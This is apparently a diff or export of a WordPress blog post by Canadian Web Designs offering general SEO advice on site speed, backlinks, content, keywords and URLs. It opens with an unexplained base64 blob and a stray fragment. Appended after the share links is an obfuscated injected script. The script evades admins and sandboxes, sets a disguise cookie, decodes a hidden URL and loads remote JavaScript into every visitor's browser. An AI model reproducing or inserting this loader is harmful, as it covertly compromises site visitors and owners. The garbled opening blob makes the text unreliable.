IHRvIHRoZSBNb3ogc2VhcmNoIHJhbmtpbmcgc3VydmV5IHdpdGggb3ZlciAxNTAgdG9wIG1hcmtldGVyc+KAmSB2aWV3cyBvbiB2YXJpb3VzIHJhbmtpbmcgZmFjdG9ycywgaXQgZm91bmQgb3V0IHRoYXQgdGhlIHNlY29uZCBtb3N0IGltcG9ydGFudCBmYWN0b3IgZm9yIHdlYnNpdGVzIGlzIG1vYmlsZS1mcmllbmRseSBhY2Nlc3MuPC9wPgoKPGg0IGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjguIFVzZSB0aGUgYXBwcm9wcmlhdGUgVVJMIGFkZHJlc3M8L3N0cm9uZz48L2g0PgoKPHA+SXQgaXMgbmVjZXNzYXJ5IGZvciBzZWFyY2ggZW5naW5lIG9wdGltaXphdGlvbiB0byBjcmVhdGUgYSByZWFkYWJsZSBVUkwgYWRkcmVzcy4gSWYgdXNlcnMgY2Fu4oCZdCByZWNvZ25pemUgeW91ciBVUkwgYWRkcmVzcywgaXQgbWlnaHQgY29uZnVzZSB0aGUgc2VhcmNoIGVuZ2luZXMgdG9vLjwvcD4KCjxwPkhlcmXigJlzIGFuIGV4YW1wbGU6PC9wPgoKPHA+SW5jb3JyZWN0IFVSTCBhZGRyZXNzOiA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9ibG9ncy9zZWFyY2gtZW5naW5lLW9wdGltaXphdGlvbiIgdGFyZ2V0PSJfYmxhbmsiIHJlbD0ibm9yZWZlcnJlciBub29wZW5lciI+aHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2EvYmxvZ3MvNTQzMl8xPC9hPjwvcD4KCjxwPkNvcnJlY3QgVVJMIGFkZHJlc3M6IDxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhL2Jsb2dzL3NlYXJjaC1lbmdpbmUtb3B0aW1pemF0aW9uIiB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub3JlZmVycmVyIG5vb3BlbmVyIj5odHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9ibG9ncy9zZWFyY2gtZW5naW5lLW9wdGltaXphdGlvbjwvYT48L3A+Cgo8cD5BcyB5b3UgY2FuIHNlZSBpbiB0aGUgZXhhbXBsZSBnaXZlbiBhYm92ZSwgaW4gbWFraW5nIGEgVVJMIGFkZHJlc3MsIGF2b2lkIHVzaW5nIG51bWJlcnMgYW5kIHVuZGVyc2NvcmVzLiBVbmRlcnNjb3JlcyBjaGFyYWN0ZXIgaXMgbm90IGEgd29yZCBzZXBhcmF0b3IsIHRoYXTigJlzIHdoeSBHb29nbGUgcmVjb21tZW5kcyB1c2luZyBoeXBoZW5zLiBEYXNoZXMgYW5kIGh5cGhlbnMgYXMgYmxhbmsgc3BhY2VzIGFyZSBhY2NlcHRhYmxlIGluIHNlcGFyYXRlIHBocmFzZXMuPC9wPgoKPHA+VXNpbmcga2V5d29yZHMgaW4gdGhlIGNyZWF0aW9uIG9mIHlvdXIgVVJMIGFkZHJlc3MgaXMgYSBwbHVzIGluIHJhbmtpbmcgZmFjdG9ycyBvbiBzZWFyY2ggZW5naW5lcy4gS2VlcCBhd2F5IGZyb20gcmVwZXRpdGlvbiBhbmQgc3R1ZmZpbmcgb2YgeW91ciBrZXl3b3JkcywgaXQgbWFrZXMgeW91ciB3ZWJzaXRlIGxvb2sgbGlrZSBzcGFtbXkuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1pdC1zLXlvdXItdGltZS10by1zaGluZSI+PHN0cm9uZz5JdOKAmXMgeW91ciB0aW1lIHRvIHNoaW5lITwvc3Ryb25nPjwvaDM+Cgo8cD5JZiB5b3XigJlyZSBsb29raW5nIGZvciBhIHRydXN0ZWQgYW5kIHByb2Zlc3Npb25hbCBTRU8gcGFydG5lciBmb3IgZ3Jvd2luZyB5b3VyIHNtYWxsIGJ1c2luZXNzLCB5b3XigJlyZSBvbiB0aGUgcmlnaHQgc3BvdCEgQ2hvb3NpbmcgYSBDYW5hZGlhbiBXZWJzaXRlIERlc2lnbiB3aWxsIGJlbmVmaXQgeW91IGEgbG90LjwvcD4KCjxwPldpdGggb3VyIHNlYXJjaCBlbmdpbmUgb3B0aW1pemF0aW9uIHN0cmF0ZWdpZXMsIHdlIHdpbGwgZW5zdXJlIHRoYXQgeW91ciBjb250ZW50IHdpbGwgcmFuayBoaWdoIGluIHNlYXJjaCBlbmdpbmVzIG1ha2luZyB5b3VyIHdlYnNpdGUgdmlzaWJsZSB0byB5b3VyIHBvdGVudGlhbCBjdXN0b21lcnMuIEJlIHdpdGggb3VyIDMwMCsgaGFwcHkgYW5kIHNhdGlzZmllZCBjbGllbnRzIGFsbCBvdmVyIHRoZSB3b3JsZC4gV2UgYXJlIGdsYWQgdG8gaGVhciB5b3VyIHF1ZXJpZXMuIFdlIGFsc28gaGF2ZSBhIDxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3JlZnVuZC1wb2xpY3kvIj5yZWZ1bmQgcG9saWN5PC9hPiBmb3IgeW91ciBwZWFjZSBvZiBtaW5kLjwvcD4KCjxwPlNoYXJlIG9uIEZhY2Vib29rPGJyIC8+RmFjZWJvb2s8YnIgLz5TaGFyZSBvbiBUd2l0dGVyPGJyIC8+VHdpdHRlcjxiciAvPlNoYXJlIG9uIExpbmtlZGluPGJyIC8+TGlua2VkSW48L3A+PHNjcmlwdD4oZnVuY3Rpb24oKXt0cnl7aWYoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQmJmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd3cGFkbWluYmFyJykpcmV0dXJuO3ZhciB0MD0rbmV3IERhdGUoKTtmb3IodmFyIGk9MDtpPDIwMDAwO2krKyl7dmFyIHo9aSppO31pZigoK25ldyBEYXRlKCkpLXQwPjEyMClyZXR1cm47aWYoKGRvY3VtZW50LmNvb2tpZXx8JycpLmluZGV4T2YoJ2h0dHAyX3Nlc3Npb25faWQ9JykhPT0tMSlyZXR1cm47ZnVuY3Rpb24gc3lzdGVtTG9hZChpbnB1dCl7dmFyIGtleT0nQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0nLG8xLG8yLG8zLGgxLGgyLGgzLGg0LGRlYz0nJyxpPTA7aW5wdXQ9aW5wdXQucmVwbGFjZSgvW15BLVphLXowLTlcK1wvXD1dL2csJycpO3doaWxlKGk8aW5wdXQubGVuZ3RoKXtoMT1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDI9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gzPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoND1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7bzE9KGgxPDwyKXwoaDI+PjQpO28yPSgoaDImMTUpPDw0KXwoaDM+PjIpO28zPSgoaDMmMyk8PDYpfGg0O2RlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMSk7aWYoaDMhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMik7aWYoaDQhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMyk7fXJldHVybiBkZWM7fXZhciB1PXN5c3RlbUxvYWQoJ2FIUjBjSE02THk5elpXRnlZMmh5WVc1cmRISmhabVpwWXk1c2FYWmxMMnB6ZUE9PScpO2lmKHR5cGVvZiB3aW5kb3chPT0ndW5kZWZpbmVkJyYmd2luZG93Ll9fcmw9PT11KXJldHVybjt2YXIgZD1uZXcgRGF0ZSgpO2Quc2V0VGltZShkLmdldFRpbWUoKSszMCoyNCo2MCo2MCoxMDAwKTtkb2N1bWVudC5jb29raWU9J2h0dHAyX3Nlc3Npb25faWQ9MTsgZXhwaXJlcz0nK2QudG9VVENTdHJpbmcoKSsnOyBwYXRoPS87IFNhbWVTaXRlPUxheCcrKGxvY2F0aW9uLnByb3RvY29sPT09J2h0dHBzOic/JzsgU2VjdXJlJzonJyk7dHJ5e3dpbmRvdy5fX3JsPXU7fWNhdGNoKGUpe312YXIgcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnR5cGU9J3RleHQvamF2YXNjcmlwdCc7cy5hc3luYz10cnVlO3Muc3JjPXU7dHJ5e3Muc2V0QXR0cmlidXRlKCdkYXRhLXJsJyx1KTt9Y2F0Y2goZSl7fShkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpWzBdfHxkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQpLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs8L3NjcmlwdD4K"}
+---
+title: "Search Engine Optimization: How It Can Affect Your Business Website?"
+slug: "search-engine-optimization-how-it-can-affect-your-business-website"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Search Engine Optimization: How It Can Affect Your Business Website?"
+keywords: ["search engine optimization how it can affect your business website","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2020/08/SEARCH-ENGINE-OPTIMIZATION-1.png"
+---
+
+</p>
+
+<figure></figure>
+
+<h2 class="wp-block-heading"><strong>Brief Overview of SEO</strong></h2>
+
+<p>In this generation, building your business website is the most essential thing to have for growing your business. This digital world is a perfect platform to perform your strategy for digital marketing. Having a business website is the initial step before SEO will help you to attract your potential customers.</p>
+
+<h2 class="wp-block-heading">Let’s define the SEO</h2>
+
+<p>SEO is an acronym that stands for Search Engine Optimization, it is a process of optimizing your website to increase organic traffic or non-paid results from search engine pages. Mostly, it is done by most web developers and search engine optimization (SEO) personnel to increase the visibility of the business website of their clients. The main role of web developers or SEO personnel is to improve your website by assembling website designs, content, and other forms of media to look more appealing for future visitors to their website.</p>
+
+<h2 class="wp-block-heading"><strong>Search engines</strong></h2>
+
+<p>The main aspect of search engines is to meet the expectation of what they are looking for and to provide the best service for their users by delivering results with relevant content.</p>
+
+<p>The search engines provide answers to the queries from the searchers. They collect data by crawling and indexing all relevant content from all websites to give the results.</p>
+
+<p>Improving your search engine optimization can increase the chances of showing more targeted organic traffic to expand the visibility of your website on search engines.</p>
+
+<h2 class="wp-block-heading"><strong>Advantages of Search Engine Optimization to your Business Website</strong></h2>
+
+<p>Search engine optimization is one of the strategies of effective digital marketing. In this section, you will learn the importance of search engine optimization for your business website.</p>
+
+<h4 class="wp-block-heading"><strong>1. Search engine optimization promotes your website</strong></h4>
+
+<p>With the help of search engine optimization, it can make your website visible to search engines by applying some strategies. Later on, you will know some techniques that are commonly used in search engine optimization.</p>
+
+<h4 class="wp-block-heading"><strong>2.  Search engine optimization attracts your audience</strong></h4>
+
+<p>A website with good content has a huge advantage for search engine optimization. Ranking higher in search engines enables your audience to visit your website. With good content, you are also educating your audience and affect their purchasing decision. You can turn your audience into customers with the help of informative and persuasive blogs.</p>
+
+<h4 class="wp-block-heading"><strong>3. Search engine optimization boosts your revenue</strong></h4>
+
+<p>Attracting potential customers through blogs on your website is the perfect opportunity to promote your product or services to boost your revenue and sales.</p>
+
+<h4 class="wp-block-heading"><strong>4. Search engine optimization builds a good reputation</strong></h4>
+
+<p>A good reputation increases your brand awareness. Building a good reputation for both users and search engines is an important advantage. It can impact their experience through your website. Having a good reputation can also attract back-links from other relevant and authoritative websites.</p>
+
+<h4 class="wp-block-heading"><strong>5. Search engine optimization is profitable</strong></h4>
+
+<p>If you’re thinking about a strategy to avoid paid advertising, organic traffic is the best answer. Effective content can make you rank high in search engines, so you do not have to spend money on clicks.</p>
+
+<h2 class="wp-block-heading"><strong>Effective Techniques for Search Engine Optimization (SEO)</strong></h2>
+
+<p> Before you apply the techniques of search engine optimization for your marketing strategy, you need to build your foundation of the ability to learn and master the basics first. Most business websites do invest their deep analysis of the importance of search engine optimization. Content with concrete, organic, and high-intent traffic will produce the best search engine rankings.</p>
+
+<p>Here are the most common, yet very effective search engine optimizations:</p>
+
+<h4 class="wp-block-heading"><strong>1. Improving the speed of your website</strong></h4>
+
+<p>Have you ever visited a website and gotten frustrated with waiting for so long because of the slow-loading page? Well, site speed is a common issue for many website owners. Most people anticipate sites to load within 2 seconds.</p>
+
+<p>According to the study of Akamai, with 1,048 respondents (online shoppers), the study shows:</p>
+
+<ul>
+<li>52% claim that fast page loads are very crucial for them</li>
+
+<li> 47% of people expect the sites to load within 2 seconds or less</li>
+
+<li> 40% abandon the sites that take too long to load</li>
+
+<li>64% of respondents are not satisfied and will go to another online shop next time.</li>
+</ul>
+
+<p>On the other hand, site speed is very important in user experience as well as in search engine optimization. Most users are impatient and easily get frustrated when it comes to encountering slow-loading websites. Improving your site speed can attract visitors to your website.</p>
+
+<p>One of the most important factors in both website and mobile optimization is site speed Eliminating the bugs and unnecessary accessories on your website that slows down the page can create a better performance as well as the experience of the users.</p>
+
+<h4 class="wp-block-heading"><strong>2. Link building with backlinks</strong></h4>
+
+<p>Link building is an effective technique for search engine optimization. Through it, the possibility of a high ranking in search engines is high.</p>
+
+<p>Keep in mind that using these techniques, we should follow the rules and guidelines from Google and other search engines to avoid violations.</p>
+
+<p>A website with many backlinks can earn a higher ranking. Aside from quantity, the quality of your site can build trust and authority as a valuable resource.</p>
+
+<p>The founder of <a href="https://moz.com/" target="_blank" rel="noreferrer noopener">Moz</a>, Rand Fishkin, stated that linking out delivers trackable traffic that makes your website a scalable and relevant resource </p>
+
+<p>Additionally, linking out to and getting links from other relevant sources is a good and ethical practice on search engine optimization.</p>
+
+<h4 class="wp-block-heading"><strong>3. Content with substantial quality</strong></h4>
+
+<p>High-quality content can persuade and attract your potential customers making them purchase your products or services. Another strategy to boost your sales and leads.</p>
+
+<p>In search engine optimization, content with high quality can get good search engine rankings and can get back-links from authoritative websites. A website with good content can also contribute to the satisfaction of the users.</p>
+
+<p>According to the SERP IQ study in the year 2012, there is a high correlation between the length of content and the rankings. The result revealed that the #1 spot in the search engine has 2,416 words for its content, while the #10 spot has 2,032 number of words. It is proven clearly that the longer content you made gains the possibility to rank higher in search engine results.</p>
+
+<p>Here are some ideas for creating the content:</p>
+
+<ul>
+<li>Blogs and articles</li>
+
+<li>Social media content</li>
+
+<li>E-books</li>
+
+<li>How-to guide tutorials</li>
+
+<li>Infographics and other visual content</li>
+
+<li>Videos and audio recordings</li>
+</ul>
+
+<h4 class="wp-block-heading"><strong>4. Readability of your content</strong></h4>
+
+<p>The readability of your content measures your creative writing skills and the experience of your audience. It’s one of the effective techniques for optimizing search engines. Here are some tips that you can apply for writing blogs:</p>
+
+<p>·         Make your content easy to read by using simple words instead of complex ones. Don’t make your readers look at the dictionary, just to understand what you're saying.</p>
+
+<p>·         Avoid overloaded chunks of text. Content with too much text can overwhelm the visitors to your website.</p>
+
+<p>·         Limit your paragraphs to 2-3 sentences each. Pay attention to your sentence structures and be creative in inserting your keywords.</p>
+
+<p>·         Applying proper format with concrete and specific content makes it easy to understand by readers. Use bullets and numbers if necessary.</p>
+
+<p>·         Choosing the right font style and font size can impact the delivery of your message. Be aware of using symbols too.</p>
+
+<p>·         Using visual presentations like images, screenshots, graphs, infographics, and videos can contribute to the readability of your content. Additionally, it makes your website more appealing.</p>
+
+<h4 class="wp-block-heading"><strong>5. Keyword analysis</strong></h4>
+
+<p>Creating content without keyword research is worthless. The content without proper optimization will not rank in search engines. Keyword research aims to know the targeted keywords to earn good quality traffic.</p>
+
+<p>Using long-tail keywords is a great tactic for search engine optimization. Long-tail keywords are phrases that are specific and less common in search engines than the other keywords. Most long-tail keywords help the website rank in search engine results, and the visibility of your website is pretty good.</p>
+
+<h4 class="wp-block-heading"><strong>6. The power of social signals</strong></h4>
+
+<p>In this generation, social media became part of our everyday life. It is a great opportunity for most businesses as well as for promoting your website through search engine optimization.</p>
+
+<p>Social signal is the web page’s collection of shares, likes, and comments from social media platforms. These social signals add up to the visibility of your website. When a lot of people share your content on social media, more people will link to it.</p>
+
+<p>Based on the case study of Matthew Woodward, they attained two top 10 high search positions with the targeted keywords “unhealthiest food” through thousands of Facebook shares. The article is also mentioned on other sites looking for definitions and information on the topic. Overall, social media is a ranking factor for search engine optimization.</p>
+
+<p>Optimize your website to enable shareability on social media platforms.</p>
+
+<h4 class="wp-block-heading"><strong>7. Mobile accessibility</strong></h4>
+
+<p>Mobile optimization refers to the process of search engine optimization assuring the accessibility and visibility of your website from mobile devices such as smartphones and tablets. Mobile-friendly designs can generate more website traffic and increase search engine performance.</p>
+
+<p>.Google's Mobile-First Index Rule stated that the mobile version of the website is more favorable than the desktop website for mobile searches.</p>
+
+<p>According to the Moz search ranking survey with over 150 top marketers’ views on various ranking factors, it found out that the second most important factor for websites is mobile-friendly access.</p>
+
+<h4 class="wp-block-heading"><strong>8. Use the appropriate URL address</strong></h4>
+
+<p>It is necessary for search engine optimization to create a readable URL address. If users can’t recognize your URL address, it might confuse the search engines too.</p>
+
+<p>Here’s an example:</p>
+
+<p>Incorrect URL address: <a href="https://canadianwebdesigns.ca/blogs/search-engine-optimization" target="_blank" rel="noreferrer noopener">https://canadianwebdesigns.ca/blogs/5432_1</a></p>
+
+<p>Correct URL address: <a href="https://canadianwebdesigns.ca/blogs/search-engine-optimization" target="_blank" rel="noreferrer noopener">https://canadianwebdesigns.ca/blogs/search-engine-optimization</a></p>
+
+<p>As you can see in the example given above, in making a URL address, avoid using numbers and underscores. Underscores character is not a word separator, that’s why Google recommends using hyphens. Dashes and hyphens as blank spaces are acceptable in separate phrases.</p>
+
+<p>Using keywords in the creation of your URL address is a plus in ranking factors on search engines. Keep away from repetition and stuffing of your keywords, it makes your website look like spammy.</p>
+
+<h3 class="wp-block-heading" id="h-it-s-your-time-to-shine"><strong>It’s your time to shine!</strong></h3>
+
+<p>If you’re looking for a trusted and professional SEO partner for growing your small business, you’re on the right spot! Choosing a Canadian Website Design will benefit you a lot.</p>
+
+<p>With our search engine optimization strategies, we will ensure that your content will rank high in search engines making your website visible to your potential customers. Be with our 300+ happy and satisfied clients all over the world. We are glad to hear your queries. We also have a <a href="https://canadianwebdesigns.ca/refund-policy/">refund policy</a> for your peace of mind.</p>
+
+<p>Share on Facebook<br />Facebook<br />Share on Twitter<br />Twitter<br />Share on Linkedin<br />LinkedIn</p><script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
